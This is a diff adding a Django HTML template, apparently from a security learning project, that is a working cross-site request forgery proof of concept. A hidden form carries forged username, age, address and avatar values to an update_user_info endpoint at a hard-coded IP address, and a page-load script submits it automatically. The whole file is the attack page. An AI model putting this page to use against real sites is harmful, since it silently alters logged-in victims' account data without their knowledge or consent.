@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+{% load staticfiles %}
+<!--⭐️文件名是post，不是创建的这个页面是post，而是通过侦测POC得知修改是post实现的。-->
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF</title>
+    <script src="{% static 'js/jquery.min.js' %}" type="text/javascript"></script>
+
+    <script type="text/javascript">
+        window.onload=function()
+        {
+            document.getElementById('submitid').click();        //通过submit id获取对象，code可以实现自动click动作
+        }
+    </script>
+</head>
+<body>
+    <form id="transfer" method="post" action="http://113.108.70.111:60732/myapp/update_user_info">
+        <input type="hidden" value="bruce" name="username" id="username">
+        <input type="hidden" value="21" name="age" id="age">
+        <input type="hidden" value="China" name="address" id="address">
+        <input type="hidden" value="/myapp/avatar/upload/images/20200605134358912037.jpeg" name="avatar" id="avatar">
+        <input id="submitid" value="submit" type="submit" name="submit" hidden>
+    </form>
+
+</body>
+</html>
